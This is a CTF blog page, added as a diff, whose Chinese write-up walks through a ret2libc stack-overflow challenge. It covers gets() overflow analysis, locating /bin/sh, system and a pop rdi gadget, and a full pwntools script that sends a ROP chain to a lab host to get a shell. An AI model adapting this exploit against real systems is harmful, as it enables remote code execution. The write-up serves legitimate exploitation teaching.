@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>ret2libc1_new | CAI dog</title>
+<meta name="keywords" content="">
+<meta name="description" content="首先查看基本信息：
+可以看到PIE未开启，但NX打开了。
+说明.text段的地址固定，但内存不可执行。
+因为是64位程序，所以我们需要考虑构造gadget
+拖入IDA查看一些基本信息：
+看到在main函数中，有一个gets函数，gets函数接收字符串时碰到&rsquo;\n&rsquo;才会停止接收，通过这个特性我们就可以构造足够长的字符串，使得栈溢出，从而覆盖程序原本的栈，达到控制程序的目的。
+计算从接收第一个字符到函数返回值之间的偏移量：
+然后在IDA中用shift&#43;f12,查看字符串：
+得到/bin/sh的地址。
+然后继续查看汇编，我们可以看到有一个call system的指令
+那么我们的思路就是，通过padding溢出到ret，然后让ret返回到call system的地址，让system调用/bin/sh的地址，这样就能够get shell。
+这/bin/sh的地址和system的地址都得到了，但是这是64位的文件，是通过寄存器，所以我们不能像32位一样将参数写入栈就不管了。
+所以这里我们不能通过将/bin/sh的地址放进栈中，而是要使用ROP找到指令将/bin/sh的地址放入寄存器rdi中：
+现在所有的要素都收集齐了，我们再理一下：
+payload = flat([&#39;a&#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)]) #ret2libc1from pwn import *#p = process(&#34;./ret2libc1&#34;)p = remote(&#39;10.0.25.109&#39;,10005)sys_addr = 0x400687bin_addr = 0x601048pop_rdi_ret = 0x400793#p.recvuntil(&#34;Hello, what&#39;s your name?\n&#34;)react = &#34;Hello, what&#39;s your name?\n&#34;payload = flat([&#39;a&#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)])#gdb.attach(p)#pause()#p.sendline(payload)p.sendlineafter(react,payload)p.interactive() ">
+<meta name="author" content="shangdi4sb">
+<link rel="canonical" href="https://jellyfish-pro.github.io/ctf/ret2libc1_new/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="ret2libc1_new" />
+<meta property="og:description" content="首先查看基本信息：
+可以看到PIE未开启，但NX打开了。
+说明.text段的地址固定，但内存不可执行。
+因为是64位程序，所以我们需要考虑构造gadget
+拖入IDA查看一些基本信息：
+看到在main函数中，有一个gets函数，gets函数接收字符串时碰到&rsquo;\n&rsquo;才会停止接收，通过这个特性我们就可以构造足够长的字符串，使得栈溢出，从而覆盖程序原本的栈，达到控制程序的目的。
+计算从接收第一个字符到函数返回值之间的偏移量：
+然后在IDA中用shift&#43;f12,查看字符串：
+得到/bin/sh的地址。
+然后继续查看汇编，我们可以看到有一个call system的指令
+那么我们的思路就是，通过padding溢出到ret，然后让ret返回到call system的地址，让system调用/bin/sh的地址，这样就能够get shell。
+这/bin/sh的地址和system的地址都得到了，但是这是64位的文件，是通过寄存器，所以我们不能像32位一样将参数写入栈就不管了。
+所以这里我们不能通过将/bin/sh的地址放进栈中，而是要使用ROP找到指令将/bin/sh的地址放入寄存器rdi中：
+现在所有的要素都收集齐了，我们再理一下：
+payload = flat([&#39;a&#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)]) #ret2libc1from pwn import *#p = process(&#34;./ret2libc1&#34;)p = remote(&#39;10.0.25.109&#39;,10005)sys_addr = 0x400687bin_addr = 0x601048pop_rdi_ret = 0x400793#p.recvuntil(&#34;Hello, what&#39;s your name?\n&#34;)react = &#34;Hello, what&#39;s your name?\n&#34;payload = flat([&#39;a&#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)])#gdb.attach(p)#pause()#p.sendline(payload)p.sendlineafter(react,payload)p.interactive() " />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/ctf/ret2libc1_new/" /><meta property="article:section" content="ctf" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ret2libc1_new"/>
+<meta name="twitter:description" content="首先查看基本信息：
+可以看到PIE未开启，但NX打开了。
+说明.text段的地址固定，但内存不可执行。
+因为是64位程序，所以我们需要考虑构造gadget
+拖入IDA查看一些基本信息：
+看到在main函数中，有一个gets函数，gets函数接收字符串时碰到&rsquo;\n&rsquo;才会停止接收，通过这个特性我们就可以构造足够长的字符串，使得栈溢出，从而覆盖程序原本的栈，达到控制程序的目的。
+计算从接收第一个字符到函数返回值之间的偏移量：
+然后在IDA中用shift&#43;f12,查看字符串：
+得到/bin/sh的地址。
+然后继续查看汇编，我们可以看到有一个call system的指令
+那么我们的思路就是，通过padding溢出到ret，然后让ret返回到call system的地址，让system调用/bin/sh的地址，这样就能够get shell。
+这/bin/sh的地址和system的地址都得到了，但是这是64位的文件，是通过寄存器，所以我们不能像32位一样将参数写入栈就不管了。
+所以这里我们不能通过将/bin/sh的地址放进栈中，而是要使用ROP找到指令将/bin/sh的地址放入寄存器rdi中：
+现在所有的要素都收集齐了，我们再理一下：
+payload = flat([&#39;a&#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)]) #ret2libc1from pwn import *#p = process(&#34;./ret2libc1&#34;)p = remote(&#39;10.0.25.109&#39;,10005)sys_addr = 0x400687bin_addr = 0x601048pop_rdi_ret = 0x400793#p.recvuntil(&#34;Hello, what&#39;s your name?\n&#34;)react = &#34;Hello, what&#39;s your name?\n&#34;payload = flat([&#39;a&#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)])#gdb.attach(p)#pause()#p.sendline(payload)p.sendlineafter(react,payload)p.interactive() "/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ctf",
+      "item": "https://jellyfish-pro.github.io/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "ret2libc1_new",
+      "item": "https://jellyfish-pro.github.io/ctf/ret2libc1_new/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "ret2libc1_new",
+  "name": "ret2libc1_new",
+  "description": "首先查看基本信息：\n可以看到PIE未开启，但NX打开了。\n说明.text段的地址固定，但内存不可执行。\n因为是64位程序，所以我们需要考虑构造gadget\n拖入IDA查看一些基本信息：\n看到在main函数中，有一个gets函数，gets函数接收字符串时碰到\u0026rsquo;\\n\u0026rsquo;才会停止接收，通过这个特性我们就可以构造足够长的字符串，使得栈溢出，从而覆盖程序原本的栈，达到控制程序的目的。\n计算从接收第一个字符到函数返回值之间的偏移量：\n然后在IDA中用shift+f12,查看字符串：\n得到/bin/sh的地址。\n然后继续查看汇编，我们可以看到有一个call system的指令\n那么我们的思路就是，通过padding溢出到ret，然后让ret返回到call system的地址，让system调用/bin/sh的地址，这样就能够get shell。\n这/bin/sh的地址和system的地址都得到了，但是这是64位的文件，是通过寄存器，所以我们不能像32位一样将参数写入栈就不管了。\n所以这里我们不能通过将/bin/sh的地址放进栈中，而是要使用ROP找到指令将/bin/sh的地址放入寄存器rdi中：\n现在所有的要素都收集齐了，我们再理一下：\npayload = flat([\u0026#39;a\u0026#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)]) #ret2libc1\rfrom pwn import *\r#p = process(\u0026#34;./ret2libc1\u0026#34;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10005)\rsys_addr = 0x400687\rbin_addr = 0x601048\rpop_rdi_ret = 0x400793\r#p.recvuntil(\u0026#34;Hello, what\u0026#39;s your name?\\n\u0026#34;)\rreact = \u0026#34;Hello, what\u0026#39;s your name?\\n\u0026#34;\rpayload = flat([\u0026#39;a\u0026#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)])\r#gdb.attach(p)\r#pause()\r#p.sendline(payload)\rp.sendlineafter(react,payload)\rp.interactive() ",
+  "keywords": [
+    
+  ],
+  "articleBody": "首先查看基本信息：\n可以看到PIE未开启，但NX打开了。\n说明.text段的地址固定，但内存不可执行。\n因为是64位程序，所以我们需要考虑构造gadget\n拖入IDA查看一些基本信息：\n看到在main函数中，有一个gets函数，gets函数接收字符串时碰到’\\n’才会停止接收，通过这个特性我们就可以构造足够长的字符串，使得栈溢出，从而覆盖程序原本的栈，达到控制程序的目的。\n计算从接收第一个字符到函数返回值之间的偏移量：\n然后在IDA中用shift+f12,查看字符串：\n得到/bin/sh的地址。\n然后继续查看汇编，我们可以看到有一个call system的指令\n那么我们的思路就是，通过padding溢出到ret，然后让ret返回到call system的地址，让system调用/bin/sh的地址，这样就能够get shell。\n这/bin/sh的地址和system的地址都得到了，但是这是64位的文件，是通过寄存器，所以我们不能像32位一样将参数写入栈就不管了。\n所以这里我们不能通过将/bin/sh的地址放进栈中，而是要使用ROP找到指令将/bin/sh的地址放入寄存器rdi中：\n现在所有的要素都收集齐了，我们再理一下：\npayload = flat(['a'*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)]) #ret2libc1\rfrom pwn import *\r#p = process(\"./ret2libc1\")\rp = remote('10.0.25.109',10005)\rsys_addr = 0x400687\rbin_addr = 0x601048\rpop_rdi_ret = 0x400793\r#p.recvuntil(\"Hello, what's your name?\\n\")\rreact = \"Hello, what's your name?\\n\"\rpayload = flat(['a'*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)])\r#gdb.attach(p)\r#pause()\r#p.sendline(payload)\rp.sendlineafter(react,payload)\rp.interactive() ",
+  "wordCount" : "58",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "shangdi4sb"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://jellyfish-pro.github.io/ctf/ret2libc1_new/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "CAI dog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://jellyfish-pro.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/posts" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/note" title="note">
+                    <span>note</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
+                    <span>ctf</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a>&nbsp;»&nbsp;<a href="https://jellyfish-pro.github.io/ctf/">ctf</a></div>
+    <h1 class="post-title">
+      ret2libc1_new
+    </h1>
+    <div class="post-meta">1 min&nbsp;·&nbsp;shangdi4sb
+
+</div>
+  </header> 
+
+  <div class="post-content"><p>首先查看基本信息：</p>
+<p><img loading="lazy" src="/ctf/ret2libc1.img/image-20220321100117980.png" alt="image-20220321100117980"  />
+</p>
+<p>可以看到PIE未开启，但NX打开了。</p>
+<p>说明.text段的地址固定，但内存不可执行。</p>
+<p>因为是64位程序，所以我们需要考虑构造gadget</p>
+<p>拖入IDA查看一些基本信息：</p>
+<p><img loading="lazy" src="/ctf/ret2libc1.img/image-20220321100954509.png" alt="image-20220321100954509"  />
+</p>
+<p>看到在main函数中，有一个gets函数，gets函数接收字符串时碰到&rsquo;\n&rsquo;才会停止接收，通过这个特性我们就可以构造足够长的字符串，使得栈溢出，从而覆盖程序原本的栈，达到控制程序的目的。</p>
+<p>计算从接收第一个字符到函数返回值之间的偏移量：</p>
+<p><img loading="lazy" src="/ctf/ret2libc1.img/image-20220321101236974.png" alt="image-20220321101236974"  />
+</p>
+<p>然后在IDA中用shift+f12,查看字符串：</p>
+<p><img loading="lazy" src="/ctf/ret2libc1.img/image-20220321101351462.png" alt="image-20220321101351462"  />
+</p>
+<p>得到/bin/sh的地址。</p>
+<p>然后继续查看汇编，我们可以看到有一个call system的指令</p>
+<p><img loading="lazy" src="/ctf/ret2libc1.img/image-20220321102025066.png" alt="image-20220321102025066"  />
+</p>
+<p>那么我们的思路就是，通过padding溢出到ret，然后让ret返回到call system的地址，让system调用/bin/sh的地址，这样就能够get shell。</p>
+<p>这/bin/sh的地址和system的地址都得到了，但是这是64位的文件，是通过寄存器，所以我们不能像32位一样将参数写入栈就不管了。</p>
+<p><img loading="lazy" src="/ctf/ret2libc1.img/image-20220321102435213.png" alt="image-20220321102435213"  />
+</p>
+<p>所以这里我们不能通过将/bin/sh的地址放进栈中，而是要使用ROP找到指令将/bin/sh的地址放入寄存器rdi中：</p>
+<p><img loading="lazy" src="/ctf/ret2libc1.img/image-20220321102700892.png" alt="image-20220321102700892"  />
+</p>
+<p>现在所有的要素都收集齐了，我们再理一下：</p>
+<p><img loading="lazy" src="/ctf/ret2libc1.img/image-20220321103237250.png" alt="image-20220321103237250"  />
+</p>
+<pre tabindex="0"><code>payload = flat([&#39;a&#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)])
+</code></pre><pre tabindex="0"><code>#ret2libc1
+
+from pwn import *
+
+#p = process(&#34;./ret2libc1&#34;)
+p = remote(&#39;10.0.25.109&#39;,10005)
+
+
+sys_addr = 0x400687
+bin_addr = 0x601048
+pop_rdi_ret = 0x400793
+
+
+
+#p.recvuntil(&#34;Hello, what&#39;s your name?\n&#34;)
+react = &#34;Hello, what&#39;s your name?\n&#34;
+
+payload = flat([&#39;a&#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)])
+#gdb.attach(p)
+#pause()
+#p.sendline(payload)
+p.sendlineafter(react,payload)
+p.interactive()
+</code></pre><p><img loading="lazy" src="/ctf/ret2libc1.img/image-20220321103702072.png" alt="image-20220321103702072"  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://jellyfish-pro.github.io/ctf/ret2csuinit_old/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>ret2csuinit_old</span>
+  </a>
+  <a class="next" href="https://jellyfish-pro.github.io/ctf/ret2libc1_old/">
+    <span class="title">Next »</span>
+    <br>
+    <span>ret2libc1_old</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
